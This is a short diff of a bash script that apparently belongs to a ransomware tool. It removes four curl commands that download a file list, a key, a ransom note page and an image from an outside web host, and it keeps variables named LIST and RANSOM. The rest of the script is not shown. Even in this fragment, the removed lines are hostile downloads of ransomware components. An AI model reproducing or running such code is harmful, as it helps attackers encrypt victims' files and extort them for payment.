@@ -1,9 +1,4 @@
 #!/bin/bash
-curl https://3shadowsand3cats.000webhostapp.com/list --output list
-curl https://3shadowsand3cats.000webhostapp.com/key --output key
-curl https://3shadowsand3cats.000webhostapp.com/ransom.html --output ransom.html
-curl https://3shadowsand3cats.000webhostapp.com/hacker.jpg --output hacker.jpg
-
 
 LIST=list
 RANSOM=ransom.html
